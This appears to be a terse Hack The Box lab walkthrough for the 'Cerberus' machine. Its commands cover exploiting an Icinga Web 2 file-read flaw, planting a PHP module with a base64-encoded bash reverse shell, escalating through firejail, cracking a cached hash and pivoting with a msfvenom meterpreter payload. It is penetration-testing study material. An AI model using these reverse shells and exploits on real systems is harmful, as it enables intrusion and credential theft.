```
nmap -sS -sC -sV -T5 -Pn 10.10.11.205
```
![image](https://github.com/regarmulia/HTB/assets/33616880/8c945ce1-850e-47d9-b545-95e5d5be3b31)


```
nano /etc/hosts
http://icinga.cerberus.local:8080/icingaweb2/authentication/login
```
![image](https://github.com/regarmulia/HTB/assets/33616880/2e53b3ba-9d4e-4e19-94c4-3ad78b2a2c15)

![image](https://github.com/regarmulia/HTB/assets/33616880/330d7aaa-bfc3-4e35-b234-af77244c7bfb)


```
https://github.com/doosec101/CVE-2022-24716
python3 exploit.py -h
python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /etc/icingaweb2/resources.ini
```
![image](https://github.com/regarmulia/HTB/assets/33616880/f53f8aae-4c25-4a22-8b45-a2deae71adcd)

![image](https://github.com/regarmulia/HTB/assets/33616880/c74c6800-1267-4351-b163-d5069f20811c)


```
OR ./lfi.py
username = "matthew"
password = "IcingaWebPassword2023"
```
![image](https://github.com/regarmulia/HTB/assets/33616880/9e630069-3f72-4fb8-bb30-1e3cba6b0812)


```
http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
```
![image](https://github.com/regarmulia/HTB/assets/33616880/e3587318-f571-491e-85bd-24cafc9f0401)


```
Login
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d98c50cf-6cd1-4f19-955e-9eaf5ca00636)


```
openssl genrsa -out private-key.pem 1024
Configuration – Application: Create a New Resource
../../../../../../../../../../../../dev/shm/test.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/7af4a30b-6f7d-4c21-a2e3-1a645d0f4ed9)

![image](https://github.com/regarmulia/HTB/assets/33616880/974644ba-82e3-4093-afd2-ad697a2418e6)


```
python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /dev/shm/test.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6a42bef0-0852-4ac7-80ef-dd5f55e849f4)


```
echo "sh -i >& /dev/tcp/10.10.14.2/10001 0>&1" | base64 -w 0
../../../../../dev/shm/training/configuration.php
Module path: /dev/shm/
Triger: Click Access Control
python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /dev/shm/training/configuration.php

<?php
{
         system("echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi8xMDAwMSAwPiYxCg==|base64 -d|bash");
}
?>

-----BEGIN PRIVATE KEY-----
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c09ce7c0-7fad-456d-9308-f70ce39597ae)

![image](https://github.com/regarmulia/HTB/assets/33616880/b1a9851d-72eb-4d0b-ad35-ec011a501987)

![image](https://github.com/regarmulia/HTB/assets/33616880/4fca906c-02ec-48c1-b086-916eae7c050f)

![image](https://github.com/regarmulia/HTB/assets/33616880/d5eac0cc-b163-43b3-98f2-6b27eeaf3c6d)


```
python3 -c 'import pty; pty.spawn("/bin/bash")’
find / -perm -4000 2>/dev/null
```
![image](https://github.com/regarmulia/HTB/assets/33616880/688e17cd-f90a-42c1-8c69-a402978553b9)


```
firejail --version
```
![image](https://github.com/regarmulia/HTB/assets/33616880/eab00318-12ec-4adb-af59-9a1bbde88edd)


```
https://www.openwall.com/lists/oss-security/2022/06/08/10/1
./firejoin.py
firejail --join=3089
su -
```
![image](https://github.com/regarmulia/HTB/assets/33616880/89365045-1e44-41f9-bc9c-e1c4d9001491)

![image](https://github.com/regarmulia/HTB/assets/33616880/ef258d83-9c59-49a2-946d-77ab18f30bc8)


```
ifconfig
```
![image](https://github.com/regarmulia/HTB/assets/33616880/7a8b416e-d9a2-4c83-b1f9-be1e52029a69)


```
ps aux | grep root
cd /var/lib/sss/db
strings cache_cerberus.local.ldb | sort -u | head
```
![image](https://github.com/regarmulia/HTB/assets/33616880/38531902-3ecb-4616-9d02-a58cf4d46ffb)

![image](https://github.com/regarmulia/HTB/assets/33616880/179029c1-fa5c-4a47-a931-d3e8ab92333a)


```
john hash -w=/usr/share/wordlists/rockyou.txt
147258369
```
![image](https://github.com/regarmulia/HTB/assets/33616880/9cddadc3-aca2-4127-b19f-3619563d7c67)


```
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.14.2 lport=10002 -f elf -o shell
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6d52758b-5933-43c3-bc7b-1478c3e2e3c0)


```
use exploit/multi/handler
run -j
use auxiliary/server/socks_proxy
run -j
```
![image](https://github.com/regarmulia/HTB/assets/33616880/ec61ef7d-8063-406f-8719-584f42e6477c)

![image](https://github.com/regarmulia/HTB/assets/33616880/e1e3def5-1d53-4c17-a068-22a19e6e0422)


